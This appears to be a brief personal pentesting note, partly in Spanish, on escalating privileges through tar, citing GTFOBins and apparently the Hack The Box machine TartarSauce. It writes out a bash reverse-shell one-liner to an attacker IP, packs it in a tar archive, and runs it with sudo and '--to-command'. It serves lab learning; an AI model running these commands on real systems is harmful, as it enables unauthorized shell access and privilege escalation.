
## DESCRIPTION



#### Mas información
*  https://gtfobins.github.io/gtfobins/tar/


## EXPLOITATION
EJEMPLO CON UN USUARIO NO ROOT:
![[Pasted image 20230606134446.png]]

EXISTE OTRA FORMA DE ELEVAR PRIVILEGIOS:

–to-command
The take advantage of this, first create a shell script that will provide a reverse shell to my host. Then put it into a tar archive.

www-data@TartarSauce:/dev/shm$ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.15.99/8082 0>&1' > a.sh
www-data@TartarSauce:/dev/shm$ tar -cvf a.tar a.sh
a.sh
Then I’ll run tar with the --to-command option. This option takes the output of the tar command, and passes it to another binary for processing. In this case, I’m having my shell script to get a shell passed to bash to run it.

www-data@TartarSauce:/dev/shm$ sudo -u onuma tar -xvf a.tar --to-command /bin/bash

## MACHINES

* Hack The Box: 

**!!NOTA IMPORTANTE!!** 